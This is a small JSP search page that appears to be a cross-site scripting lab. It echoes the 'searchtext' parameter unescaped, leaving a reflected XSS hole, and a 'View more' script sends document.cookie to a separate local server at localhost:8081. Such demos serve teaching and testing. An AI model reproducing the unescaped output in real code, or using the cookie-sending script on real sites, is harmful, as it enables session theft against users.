<html>
<body>
<h2>Welcome to Search website</h2>
<%
if(request.getParameter("searchtext")!=null){
    out.println(request.getParameter("searchtext"));
    }%>
 <form  method="GET" action="search">
              Search for: <input type="text" name="searchtext"/>
                <button type="submit">Search</button>
   </form>
            <button onclick="go()">View more</button>
            </body>
<script>
            function go(){
                const http=new XMLHttpRequest();
                const val=document.cookie;
            http.open('GET',"http://localhost:8081/XSS-Exploit/welcome?search="+val);
                http.send();
                console.log(http.responseText);
            }
            </script>
</html>
